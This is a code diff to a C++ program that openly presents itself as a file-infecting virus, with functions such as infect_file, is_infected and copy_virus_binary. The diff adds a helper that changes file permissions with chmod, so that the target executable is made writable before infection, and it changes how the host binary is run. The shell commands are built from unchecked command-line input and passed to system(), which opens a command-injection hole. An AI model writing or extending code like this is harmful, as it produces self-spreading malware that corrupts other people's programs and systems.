@@ -14,6 +14,7 @@ void create_directory(std::string directory);
 void copy_binary(std::string host, std::string folder);
 void copy_uninfected_binary(std::string host, std::string folder);
 void modify_execute_access(std::string fileName, bool enable);
+void modify_write_access(std::string fileName, bool enable);
 int get_file_size(std::string fileName);
 void build_seed(std::string programName);
 void copy_virus_binary(std::string host, std::string folder);
@@ -32,15 +33,23 @@ int main(int argc, char** argv) {
     std::string temporaryLocation = "garbage";
     std::string folder = "./tem/";
     create_directory(folder);
-    if(argc > 1){
-      fileName = argv[1];
+    if(argc == 1){
       copy_uninfected_binary(hostName, folder);
       std::string command = hostName;
       command.insert(0, folder);
+      system(command.c_str());
+    }
+    if(argc > 1){
+      copy_uninfected_binary(hostName, folder);
+      std::string command = hostName;
+      command.insert(0, folder);
+      fileName = argv[1];
       command.insert(command.length(), " " + fileName);
       if(is_file_exist(fileName)){
         system(command.c_str());
         if(!is_infected(hostName, fileName)){
+          modify_write_access(fileName, true);
+          modify_execute_access(fileName, false);
           make_temp_copy(hostName, fileName, folder, temporaryLocation);
           infect_file(hostName, fileName, folder, temporaryLocation);
         }
@@ -231,6 +240,18 @@ void modify_execute_access(std::string fileName, bool enable){
     }
     else{
       cmdBuilder.insert(0, "chmod ugo-x ");  
+    }
+    const char*command  = cmdBuilder.c_str();
+    system(command);
+}
+
+void modify_write_access(std::string fileName, bool enable){
+    std::string cmdBuilder = fileName;
+    if(enable){
+      cmdBuilder.insert(0, "chmod ugo+w ");  
+    }
+    else{
+      cmdBuilder.insert(0, "chmod ugo-w ");  
     }
     const char*command  = cmdBuilder.c_str();
     system(command);
